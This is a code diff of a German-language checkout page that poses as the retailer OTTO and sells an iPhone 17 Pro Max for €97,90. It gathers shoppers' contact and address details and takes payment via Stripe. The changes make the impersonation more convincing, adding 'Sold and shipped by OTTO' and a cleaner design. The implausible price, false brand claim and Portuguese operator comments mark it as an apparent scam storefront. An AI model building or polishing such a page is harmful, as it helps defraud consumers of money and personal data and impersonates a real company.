@@ -1,149 +1,266 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Checkout Seguro</title>
-
-<script src="https://cdn.tailwindcss.com"></script>
-<script src="https://js.stripe.com/v3/"></script>
-
-<style>
-body { background:#f7f7f7 }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OTTO – Sicherer Checkout</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://js.stripe.com/v3/"></script>
 </head>
 
-<body class="flex justify-center p-4">
+<body class="min-h-screen bg-[#f5f5f7] text-[#111827]">
+  <div class="max-w-md mx-auto px-4 py-6">
 
-<div class="w-full max-w-md">
-
-  <!-- LOGO -->
-  <div class="flex justify-center mb-4">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Otto_logo.svg" class="h-10">
-  </div>
-
-  <!-- PRODUTO -->
-  <div class="bg-white rounded-2xl p-4 shadow mb-4">
-
-    <!-- INPUT TROCAR IMAGEM -->
-    <input id="imgInput"
-      placeholder="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Otto_GmbH_logo.svg/3840px-Otto_GmbH_logo.svg.png"
-      class="w-full mb-3 p-2 border rounded-lg text-sm"/>
-
-    <!-- IMAGEM -->
-    <img id="productImg"
-      src="https://via.placeholder.com/400"
-      class="rounded-xl mb-3 w-full object-cover">
-
-    <h2 class="font-bold text-lg">
-      Apple iPhone 17 Pro Max 512GB
-    </h2>
-
-    <p class="text-green-600 font-bold text-xl mt-1">
-      €97,90
-    </p>
-
-    <div class="text-sm text-gray-500 mt-2">
-      ⭐⭐⭐⭐⭐ 4.8/5 • 5.214 Kunden
+    <!-- LOGO -->
+    <div class="flex justify-center mb-6">
+      <img
+        src="https://i.imgur.com/HIXqTCU.png"
+        alt="OTTO"
+        class="h-10 object-contain"
+      />
     </div>
 
-    <div class="text-red-500 text-sm mt-1">
-      🔥 Nur noch 7 Stück verfügbar
+    <!-- CARD PRINCIPAL -->
+    <div class="bg-white rounded-2xl shadow-[0_8px_30px_rgba(0,0,0,0.06)] overflow-hidden border border-gray-100">
+
+      <!-- RESUMO DO PEDIDO -->
+      <div class="px-5 pt-5 pb-4 border-b border-gray-100">
+        <p class="text-[11px] uppercase tracking-[0.18em] text-gray-400 mb-3">
+          Bestellübersicht
+        </p>
+
+        <div class="flex gap-4 items-start">
+          <div class="w-[74px] h-[74px] rounded-xl bg-gray-50 border border-gray-100 overflow-hidden shrink-0">
+            <img
+              src="https://i.imgur.com/rxLCgf3.jpeg"
+              alt="Apple iPhone 17 Pro Max 512GB"
+              class="w-full h-full object-cover"
+            />
+          </div>
+
+          <div class="flex-1 min-w-0">
+            <h1 class="text-[15px] leading-5 font-semibold text-gray-900">
+              Apple iPhone 17 Pro Max 512GB
+            </h1>
+
+            <p class="text-[13px] text-gray-500 mt-1">
+              Verkauf und Versand durch OTTO.
+            </p>
+
+            <div class="mt-3 flex items-center justify-between">
+              <span class="text-[13px] text-gray-500">Gesamtbetrag</span>
+              <span class="text-[22px] font-semibold tracking-tight text-gray-900">€97,90</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- INFOS -->
+      <div class="px-5 py-3 bg-[#fcfcfc] border-b border-gray-100">
+        <div class="grid grid-cols-3 gap-2 text-center text-[11px] text-gray-500">
+          <div class="flex flex-col items-center gap-1">
+            <span class="text-base">🔒</span>
+            <span>Sicher bezahlen</span>
+          </div>
+          <div class="flex flex-col items-center gap-1">
+            <span class="text-base">🚚</span>
+            <span>Versand nach DE</span>
+          </div>
+          <div class="flex flex-col items-center gap-1">
+            <span class="text-base">↩️</span>
+            <span>Einfache Abwicklung</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- FORM -->
+      <div class="p-5">
+        <p class="text-[11px] uppercase tracking-[0.18em] text-gray-400 mb-4">
+          Lieferdaten
+        </p>
+
+        <div class="space-y-3">
+          <input id="email" type="email" placeholder="E-Mail"
+            class="w-full h-12 rounded-xl border border-gray-200 px-4 text-[15px] outline-none focus:border-gray-400" />
+
+          <input id="name" type="text" placeholder="Vollständiger Name"
+            class="w-full h-12 rounded-xl border border-gray-200 px-4 text-[15px] outline-none focus:border-gray-400" />
+
+          <input id="phone" type="text" placeholder="Telefonnummer"
+            class="w-full h-12 rounded-xl border border-gray-200 px-4 text-[15px] outline-none focus:border-gray-400" />
+
+          <input id="line1" type="text" placeholder="Straße und Hausnummer"
+            class="w-full h-12 rounded-xl border border-gray-200 px-4 text-[15px] outline-none focus:border-gray-400" />
+
+          <input id="line2" type="text" placeholder="Adresszusatz (optional)"
+            class="w-full h-12 rounded-xl border border-gray-200 px-4 text-[15px] outline-none focus:border-gray-400" />
+
+          <div class="grid grid-cols-2 gap-3">
+            <input id="postal" type="text" placeholder="PLZ"
+              class="w-full h-12 rounded-xl border border-gray-200 px-4 text-[15px] outline-none focus:border-gray-400" />
+
+            <input id="city" type="text" placeholder="Ort"
+              class="w-full h-12 rounded-xl border border-gray-200 px-4 text-[15px] outline-none focus:border-gray-400" />
+          </div>
+        </div>
+
+        <button id="prepareBtn"
+          class="w-full h-12 mt-5 rounded-xl bg-[#e30613] text-white text-[15px] font-semibold hover:opacity-95 transition">
+          Weiter zur sicheren Zahlung
+        </button>
+
+        <div id="paymentWrap" class="hidden mt-5">
+          <p class="text-[11px] uppercase tracking-[0.18em] text-gray-400 mb-3">
+            Zahlung
+          </p>
+
+          <div class="rounded-xl border border-gray-200 p-4 bg-white">
+            <div id="payment-element"></div>
+          </div>
+
+          <button id="payBtn"
+            class="w-full h-12 mt-4 rounded-xl bg-[#111827] text-white text-[15px] font-semibold hover:opacity-95 transition hidden">
+            Jetzt sicher bezahlen
+          </button>
+        </div>
+
+        <p id="msg" class="text-sm text-red-600 mt-4"></p>
+
+        <p class="text-[12px] text-gray-400 mt-5 leading-5">
+          Mit dem Fortfahren bestätigen Sie Ihre Bestellung und stimmen der sicheren Zahlungsabwicklung zu.
+        </p>
+      </div>
     </div>
   </div>
 
-  <!-- CONFIANÇA -->
-  <div class="flex justify-between text-xs text-gray-600 mb-4">
-    <span>🔒 Sicher</span>
-    <span>🚚 Lieferung DE</span>
-    <span>💳 Geschützt</span>
-  </div>
+  <script>
+    const stripe = Stripe("pk_test_51TBgoGEW8oxEd9zwTAYExiMbsojNAhPFukQqgePMWLNCjiwCKx6ykphs9617ZR9JkMjqf0mf2zrq3pUc9xt2WLtn00gCMYs146")
 
-  <!-- FORM -->
-  <div class="bg-white p-4 rounded-2xl shadow">
+    let elements = null
 
-    <input id="email" placeholder="E-Mail" class="w-full mb-2 p-3 border rounded-xl"/>
-    <input id="name" placeholder="Name" class="w-full mb-2 p-3 border rounded-xl"/>
-    <input id="phone" placeholder="Telefon" class="w-full mb-2 p-3 border rounded-xl"/>
-    <input id="line1" placeholder="Adresse" class="w-full mb-2 p-3 border rounded-xl"/>
-    <input id="postal" placeholder="PLZ" class="w-full mb-2 p-3 border rounded-xl"/>
-    <input id="city" placeholder="Stadt" class="w-full mb-3 p-3 border rounded-xl"/>
+    const emailEl = document.getElementById('email')
+    const nameEl = document.getElementById('name')
+    const phoneEl = document.getElementById('phone')
+    const line1El = document.getElementById('line1')
+    const line2El = document.getElementById('line2')
+    const postalEl = document.getElementById('postal')
+    const cityEl = document.getElementById('city')
 
-    <div id="payment-element" class="mb-4"></div>
+    const prepareBtn = document.getElementById('prepareBtn')
+    const payBtn = document.getElementById('payBtn')
+    const paymentWrap = document.getElementById('paymentWrap')
+    const msg = document.getElementById('msg')
 
-    <button id="payBtn"
-      class="w-full bg-green-600 text-white p-4 rounded-xl font-bold text-lg">
-      Sicher bezahlen 🔒
-    </button>
-
-    <p id="msg" class="text-red-500 text-sm mt-2"></p>
-  </div>
-
-</div>
-
-<script>
-const stripe = Stripe("pk_test_51TBgoGEW8oxEd9zwTAYExiMbsojNAhPFukQqgePMWLNCjiwCKx6ykphs9617ZR9JkMjqf0mf2zrq3pUc9xt2WLtn00gCMYs146")
-
-let elements
-
-// TROCAR IMAGEM EM TEMPO REAL
-document.getElementById('imgInput').addEventListener('input', (e) => {
-  document.getElementById('productImg').src = e.target.value
-})
-
-// INICIA STRIPE DIRETO
-async function init() {
-  const res = await fetch('/create-payment-intent', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({})
-  })
-
-  const data = await res.json()
-
-  elements = stripe.elements({
-    clientSecret:data.clientSecret
-  })
-
-  const payment = elements.create('payment')
-  payment.mount('#payment-element')
-}
-
-init()
-
-// PAGAMENTO
-document.getElementById('payBtn').onclick = async () => {
-
-  const email = document.getElementById('email').value
-  const name = document.getElementById('name').value
-  const phone = document.getElementById('phone').value
-  const line1 = document.getElementById('line1').value
-  const postal = document.getElementById('postal').value
-  const city = document.getElementById('city').value
-
-  const { error } = await stripe.confirmPayment({
-    elements,
-    confirmParams:{
-      receipt_email: email,
-      shipping:{
-        name,
-        phone,
-        address:{
-          line1,
-          postal_code: postal,
-          city,
-          country:'DE'
-        }
-      },
-      return_url: window.location.origin + "/sucesso.html"
+    function getFormData() {
+      return {
+        email: emailEl.value.trim(),
+        name: nameEl.value.trim(),
+        phone: phoneEl.value.trim(),
+        line1: line1El.value.trim(),
+        line2: line2El.value.trim(),
+        postal: postalEl.value.trim(),
+        city: cityEl.value.trim()
+      }
     }
-  })
 
-  if(error){
-    document.getElementById('msg').textContent = error.message
-  }
-}
-</script>
+    function validateForm(data) {
+      if (!data.email || !data.name || !data.phone || !data.line1 || !data.postal || !data.city) {
+        return 'Bitte füllen Sie alle Pflichtfelder aus.'
+      }
+      return ''
+    }
 
+    prepareBtn.addEventListener('click', async () => {
+      msg.textContent = ''
+
+      const form = getFormData()
+      const errorText = validateForm(form)
+
+      if (errorText) {
+        msg.textContent = errorText
+        return
+      }
+
+      prepareBtn.disabled = true
+      prepareBtn.textContent = 'Wird vorbereitet...'
+
+      try {
+        const res = await fetch('/create-payment-intent', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(form)
+        })
+
+        const data = await res.json()
+
+        if (!res.ok) {
+          throw new Error(data.error || 'Fehler beim Starten der Zahlung.')
+        }
+
+        elements = stripe.elements({
+          clientSecret: data.clientSecret,
+          locale: 'de'
+        })
+
+        const paymentElement = elements.create('payment')
+        paymentElement.mount('#payment-element')
+
+        paymentWrap.classList.remove('hidden')
+        payBtn.classList.remove('hidden')
+        prepareBtn.classList.add('hidden')
+
+        emailEl.disabled = true
+        nameEl.disabled = true
+        phoneEl.disabled = true
+        line1El.disabled = true
+        line2El.disabled = true
+        postalEl.disabled = true
+        cityEl.disabled = true
+      } catch (error) {
+        msg.textContent = error.message || 'Unbekannter Fehler.'
+        prepareBtn.disabled = false
+        prepareBtn.textContent = 'Weiter zur sicheren Zahlung'
+      }
+    })
+
+    payBtn.addEventListener('click', async () => {
+      msg.textContent = ''
+
+      if (!elements) {
+        msg.textContent = 'Zahlungselement nicht geladen.'
+        return
+      }
+
+      payBtn.disabled = true
+      payBtn.textContent = 'Wird verarbeitet...'
+
+      const form = getFormData()
+
+      const { error } = await stripe.confirmPayment({
+        elements,
+        confirmParams: {
+          receipt_email: form.email,
+          shipping: {
+            name: form.name,
+            phone: form.phone,
+            address: {
+              line1: form.line1,
+              line2: form.line2 || '',
+              postal_code: form.postal,
+              city: form.city,
+              country: 'DE'
+            }
+          },
+          return_url: window.location.origin + '/sucesso.html'
+        }
+      })
+
+      if (error) {
+        msg.textContent = error.message || 'Zahlung fehlgeschlagen.'
+        payBtn.disabled = false
+        payBtn.textContent = 'Jetzt sicher bezahlen'
+      }
+    })
+  </script>
 </body>
 </html>
